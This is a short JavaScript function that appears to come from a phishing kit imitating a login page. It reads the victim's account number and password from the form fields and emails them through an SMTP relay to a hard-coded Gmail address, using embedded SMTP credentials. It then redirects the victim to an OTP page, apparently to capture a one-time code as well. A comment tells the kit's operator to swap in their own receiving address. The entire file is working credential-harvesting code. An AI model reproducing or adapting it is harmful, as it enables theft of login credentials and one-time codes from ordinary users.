function emailSend() {
  var accounntNumber = document.getElementById('MainContent_LoginSection_UserID_ctrl').value;
  var password = document.getElementById('MainContent_LoginSection_Password_ctrl').value;
  var messageBody = "Email " + accounntNumber +
    "<br/> pass " + password;

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "burujikasamu42@gmail.com",
    Password: "4EBB12813A91DC5063FFFB31AF367160FECC",
    To: 'burujikasamu42@gmail.com', // Change this to your email address where you want to receive the OTP
    From: "burujikasamu42@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html';
      }
      else {
        swal("Error", "Please complete form details", "error")
      }
    }
  );
}